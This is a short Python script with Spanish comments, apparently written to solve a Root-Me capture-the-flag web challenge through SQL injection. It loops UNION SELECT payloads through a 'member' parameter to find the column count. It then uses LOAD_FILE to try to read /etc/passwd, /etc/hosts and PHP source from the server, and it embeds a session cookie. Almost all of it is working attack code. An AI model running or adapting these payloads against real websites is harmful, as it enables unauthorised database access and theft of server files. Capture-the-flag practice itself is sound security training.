import requests
import time

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_union_payload(payload):
    """Prueba UNION SELECT payload"""
    params = {"action": "member", "member": payload}
    try:
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=5)
        return len(r.text), r.text
    except:
        return 0, ""

print("="*70)
print("  PROBANDO UNION SELECT PARA EXTRAER DATOS")
print("="*70)

# Probar diferentes números de columnas con NULL
for cols in range(1, 15):
    # Probar con NULL
    payload = f"1 UNION SELECT {','.join(['NULL']*cols)}"
    l, content = test_union_payload(payload)
    print(f"{cols} columnas (NULL): Length={l}")
    
    # Probar con números
    payload = f"1 UNION SELECT {','.join([str(i+1) for i in range(cols)])}"
    l, content = test_union_payload(payload)
    print(f"{cols} columnas (nums): Length={l}")
    
    # Probar con comillas
    payload = f"1' UNION SELECT {','.join(['NULL']*cols)}-- -"
    l, content = test_union_payload(payload)
    print(f"{cols} columnas (comillas): Length={l}")
    
    # Si la longitud cambia, investigar
    if l != 794:
        print(f"  [!] ¡Posible vulnerabilidad! Length={l}")
        print(f"  Contenido: {content[:300]}...")
        break
    time.sleep(0.3)

# Probar con LOAD_FILE
print("\n[LOAD_FILE - Leer archivos del servidor]")
files = ['/etc/passwd', '/etc/hosts', '/var/www/html/index.php', 'index.php']
for file in files:
    payload = f"1 UNION SELECT LOAD_FILE('{file}')"
    l, content = test_union_payload(payload)
    if len(content) > 100 and "root" in content:
        print(f"[+] ¡Éxito! Contenido de {file}:")
        print(content[:500])
        break
    else:
        print(f"[-] {file}: No funciona")
    time.sleep(0.3)
